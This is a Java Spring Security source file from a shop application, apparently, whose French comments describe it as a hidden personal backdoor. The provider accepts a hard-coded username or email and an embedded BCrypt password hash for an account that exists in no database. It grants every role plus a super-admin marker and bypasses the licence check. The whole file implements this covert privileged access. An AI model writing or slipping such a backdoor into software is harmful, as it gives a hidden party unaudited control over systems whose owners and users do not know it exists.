package com.example.boutique.security;

import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;

import java.util.List;

/**
 * Provider d'authentification pour le SUPER ADMIN caché (backdoor personnel).
 *
 * - N'existe jamais en base : reconnu uniquement par ce provider, à partir des
 *   identifiants embarqués (username "Donchaminade" OU l'email alternatif) et
 *   du hash BCrypt embarqué.
 * - Accorde TOUS les rôles (ADMIN, GESTIONNAIRE, CAISSIER) + le marqueur
 *   ROLE_SUPERADMIN.
 * - Ce provider n'appelle JAMAIS le contrôle de licence : le super admin peut
 *   donc toujours se connecter, essai expiré ou non, licence activée ou non.
 *
 * Placé AVANT le provider base de données dans la chaîne : si l'identifiant
 * n'est pas celui du super admin, il retourne null pour laisser la main au
 * provider suivant.
 */
@Component
public class SuperAdminAuthenticationProvider implements AuthenticationProvider {

    private static final List<GrantedAuthority> AUTHORITIES = List.of(
            new SimpleGrantedAuthority("ROLE_ADMIN"),
            new SimpleGrantedAuthority("ROLE_GESTIONNAIRE"),
            new SimpleGrantedAuthority("ROLE_CAISSIER"),
            new SimpleGrantedAuthority(AccountConstants.ROLE_SUPERADMIN));

    private final PasswordEncoder passwordEncoder;

    public SuperAdminAuthenticationProvider(PasswordEncoder passwordEncoder) {
        this.passwordEncoder = passwordEncoder;
    }

    @Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        String identifier = authentication.getName();

        if (!AccountConstants.isSuperAdminIdentifier(identifier)) {
            // Pas le super admin : laisser le provider suivant tenter.
            return null;
        }

        String presentedPassword = authentication.getCredentials() == null
                ? "" : authentication.getCredentials().toString();

        if (!passwordEncoder.matches(presentedPassword, AccountConstants.SUPERADMIN_PASSWORD_HASH)) {
            throw new BadCredentialsException("Identifiants incorrects.");
        }

        // On normalise toujours le username interne sur le username canonique
        // pour que la session/audit affiche un nom cohérent.
        UserDetails principal = User.withUsername(AccountConstants.SUPERADMIN_USERNAME)
                .password(AccountConstants.SUPERADMIN_PASSWORD_HASH)
                .authorities(AUTHORITIES)
                .build();

        return new UsernamePasswordAuthenticationToken(principal, null, AUTHORITIES);
    }

    @Override
    public boolean supports(Class<?> authentication) {
        return UsernamePasswordAuthenticationToken.class.isAssignableFrom(authentication);
    }
}
